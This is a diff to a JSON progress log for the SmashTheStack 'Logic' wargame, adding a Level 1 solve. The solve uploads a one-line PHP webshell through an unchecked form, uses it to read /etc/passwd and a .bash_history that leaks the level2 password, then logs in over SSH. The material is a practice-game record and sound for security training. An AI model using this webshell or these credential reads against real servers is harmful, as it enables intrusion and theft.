@@ -3,8 +3,115 @@
  "host": "logic.smashthestack.org",
  "network": "smashthestack.org",
  "port": 2227,
- "status": "online (probed 2026-11-24 18:30Z: web port 88 open)",
+ "status": "online (L1 solved 2026-11-26: web upload -> PHP webshell -> .bash_history -> level2 login verified)",
  "note": "Added to scope 2026-11-24. Level 1 is a WEB level at http://logic.smashthestack.org:8181/index.html. After that: ssh -l levelN logic.smashthestack.org -p2227 (replace levelN with the current level, e.g. level3). Tags/hall-of-fame links on the game page (logic.smashthestack.org:88) show level2..level11, i.e. at least 11 levels beyond the web level1. Mix of buffer overflows, format strings, assembly, vulnerable web apps, heap attacks. Verify live level count when starting.",
- "levels": [],
+ "levels": [
+  {
+   "lvl": 1,
+   "user": "level2",
+   "pw": "ach3sa6F",
+   "steps": [
+    {
+     "cmd": "curl -s \"http://logic.smashthestack.org:8181/index.html\" | head -20",
+     "out": [
+      "<html><head><title>Logic @ SmashTheStack -- Level 1  (Send Security Clearance)</title></head>",
+      "<H1>Level 1</H1>",
+      "Please upload your security clearance. Files will be in uploads/",
+      "<form enctype=\"multipart/form-data\" action=\"send_clearance.php\" method=\"POST\">",
+      "Once clearance is obtained, poke around the user directories for access to level2"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/shell.php",
+     "out": [
+      "",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/shell.php",
+     "out": [
+      "<?php echo \"<pre>\" . shell_exec($_GET['c']) . \"</pre>\"; ?>",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/shell.php",
+     "out": [
+      "<?php echo \"<pre>\" . shell_exec($_GET['c']) . \"</pre>\"; ?>",
+      "\"/tmp/shell.php\" 2 lines, 60 bytes written",
+      ""
+     ]
+    },
+    {
+     "cmd": "curl -s -F \"MAX_FILE_SIZE=100000\" -F \"uploadedfile=@/tmp/shell.php;type=application/x-php\" \"http://logic.smashthestack.org:8181/send_clearance.php\"",
+     "out": [
+      "The file shell.php has been uploaded"
+     ]
+    },
+    {
+     "cmd": "curl -s \"http://logic.smashthestack.org:8181/uploads/shell.php?c=id\"",
+     "out": [
+      "uid=601(level1) gid=601(level1) groups=601(level1),615(nosu)"
+     ]
+    },
+    {
+     "cmd": "curl -s \"http://logic.smashthestack.org:8181/uploads/shell.php?c=grep+level+/etc/passwd\"",
+     "out": [
+      "level:x:502:502::/home/level:/bin/bash",
+      "level1:x:601:601::/home/level1:/bin/bash",
+      "level2:x:604:604::/home/level2:/bin/bash",
+      "level3:x:602:602::/home/level3:/bin/bash"
+     ]
+    },
+    {
+     "cmd": "curl -s \"http://logic.smashthestack.org:8181/uploads/shell.php?c=ls+-la+/home/level1\"",
+     "out": [
+      "-rw-r--r--  1 root   level1   43 Sep 19  2010 .bash_history",
+      "drwxr-x---  5 level1 level1 4096 Mar 12  2024 ."
+     ]
+    },
+    {
+     "cmd": "curl -s \"http://logic.smashthestack.org:8181/uploads/shell.php?c=cat+/home/level1/.bash_history\"",
+     "out": [
+      "ls",
+      "who",
+      "cat README",
+      "ach3sa6F",
+      "clear",
+      "su level2"
+     ]
+    },
+    {
+     "cmd": "ssh -o StrictHostKeyChecking=accept-new -o HostKeyAlgorithms=+ssh-rsa,ssh-dss -o KexAlgorithms=+diffie-hellman-group14-sha1 -l level2 logic.smashthestack.org -p 2227",
+     "out": [
+      "Level1 is not accessed via SSH. Please find it online at:",
+      "http://logic.smashthestack.org:8181/index.html",
+      "level2@logic.smashthestack.org's password:",
+      "Welcome to the Logic Wargame on Smash The Stack",
+      "Levels are in /levels/",
+      "Passes are located in ~/.pass"
+     ]
+    },
+    {
+     "cmd": "id",
+     "out": [
+      "uid=604(level2) gid=604(level2) groups=604(level2),615(nosu)"
+     ]
+    },
+    {
+     "cmd": "cat ~/.pass",
+     "out": [
+      "ach3sa6F"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": []
+    }
+   ],
+   "note": "WEB level: send_clearance.php moves ANY uploaded file into /srv/www/level1/uploads/ with no extension/type check, and PHP executes there: a one-line webshell runs as uid=601(level1). Poking around the user dirs (the page's own hint) reveals /home/level1/.bash_history with the level2 password typed in plain (ach3sa6F, right after 'cat README'). The box's SSH banner confirms level1 is web-only. Level2 login verified live 2026-11-26; ~/.pass = ach3sa6F. SSH kex: needs -o KexAlgorithms=+diffie-hellman-group14-sha1 (old sshd)."
+  }
+ ],
  "goals": {}
 }
